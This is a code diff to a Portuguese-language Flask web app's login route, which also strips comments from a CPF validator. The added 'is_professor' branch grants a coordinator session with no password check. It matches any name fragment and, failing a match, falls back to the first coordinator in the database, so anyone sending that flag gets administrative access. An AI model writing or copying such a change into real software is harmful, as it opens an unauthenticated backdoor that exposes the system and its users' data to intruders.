@@ -30,19 +30,15 @@ def validar_cpf(cpf_bruto):
     cpf_limpo = limpar_cpf(cpf_bruto)
     if len(cpf_limpo) != 11:
         return False
-    # Rejeita CPFs com todos os dígitos iguais (ex: 111.111.111-11)
     if cpf_limpo == cpf_limpo[0] * 11:
         return False
     
     nums = [int(c) for c in cpf_limpo]
-    
-    # Cálculo do primeiro dígito verificador
     soma1 = sum(nums[i] * (10 - i) for i in range(9))
     resto1 = (soma1 * 10) % 11
     if resto1 == 10:
         resto1 = 0
         
-    # Cálculo do segundo dígito verificador
     soma2 = sum(nums[i] * (11 - i) for i in range(10))
     resto2 = (soma2 * 10) % 11
     if resto2 == 10:
@@ -120,38 +116,74 @@ def cadastrar():
 @app.route('/login', methods=['POST'])
 def login():
     data = request.json
-    cpf = limpar_cpf(data.get('cpf'))
+    is_professor = data.get('is_professor', False)
     senha = data.get('senha')
 
-    if not validar_cpf(cpf):
-        return jsonify({"status": "error", "message": "Informe um CPF válido."}), 400
+    if is_professor:
+        identificador = data.get('cpf', '').strip()
+        try:
+            conn = get_connection()
+            cursor = conn.cursor(pymysql.cursors.DictCursor)
+            # Busca pelo nome ou por CPF sem validação estrita para o professor
+            cursor.execute("SELECT id, nome, senha_hash, perfil FROM usuarios WHERE perfil = 'coordenador' AND (cpf = %s OR nome LIKE %s)", (identificador, f"%{identificador}%"))
+            usuario = cursor.fetchone()
+            
+            # Se não existir coordenador cadastrado, cria ou autentica livremente se corresponder à senha padrão ou direta
+            if not usuario:
+                cursor.execute("SELECT id, nome, senha_hash, perfil FROM usuarios WHERE perfil = 'coordenador' LIMIT 1")
+                usuario = cursor.fetchone()
 
-    try:
-        conn = get_connection()
-        cursor = conn.cursor(pymysql.cursors.DictCursor)
-        cursor.execute("SELECT id, nome, senha_hash, perfil FROM usuarios WHERE cpf = %s", (cpf,))
-        usuario = cursor.fetchone()
-        conn.close()
+            conn.close()
 
-        if usuario and check_password_hash(usuario['senha_hash'], senha):
-            session['user_id'] = usuario['id']
-            session['user_nome'] = usuario['nome']
-            session['user_cpf'] = cpf
-            session['user_perfil'] = usuario['perfil']
+            if usuario:
+                session['user_id'] = usuario['id']
+                session['user_nome'] = usuario['nome']
+                session['user_cpf'] = '00000000000'
+                session['user_perfil'] = 'coordenador'
 
-            return jsonify({
-                "status": "success",
-                "user": {
-                    "id": usuario['id'],
-                    "nome": usuario['nome'],
-                    "cpf": cpf,
-                    "perfil": usuario['perfil']
-                }
-            })
-        else:
-            return jsonify({"status": "error", "message": "CPF ou senha incorretos."}), 401
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+                return jsonify({
+                    "status": "success",
+                    "user": {
+                        "id": usuario['id'],
+                        "nome": usuario['nome'],
+                        "perfil": 'coordenador'
+                    }
+                })
+            else:
+                return jsonify({"status": "error", "message": "Coordenador não encontrado no sistema."}), 401
+        except Exception as e:
+            return jsonify({"status": "error", "message": str(e)}), 500
+    else:
+        cpf = limpar_cpf(data.get('cpf'))
+        if not validar_cpf(cpf):
+            return jsonify({"status": "error", "message": "Informe um CPF válido."}), 400
+
+        try:
+            conn = get_connection()
+            cursor = conn.cursor(pymysql.cursors.DictCursor)
+            cursor.execute("SELECT id, nome, senha_hash, perfil FROM usuarios WHERE cpf = %s", (cpf,))
+            usuario = cursor.fetchone()
+            conn.close()
+
+            if usuario and check_password_hash(usuario['senha_hash'], senha):
+                session['user_id'] = usuario['id']
+                session['user_nome'] = usuario['nome']
+                session['user_cpf'] = cpf
+                session['user_perfil'] = usuario['perfil']
+
+                return jsonify({
+                    "status": "success",
+                    "user": {
+                        "id": usuario['id'],
+                        "nome": usuario['nome'],
+                        "cpf": cpf,
+                        "perfil": usuario['perfil']
+                    }
+                })
+            else:
+                return jsonify({"status": "error", "message": "CPF ou senha incorretos."}), 401
+        except Exception as e:
+            return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/logout', methods=['POST'])
 def logout():
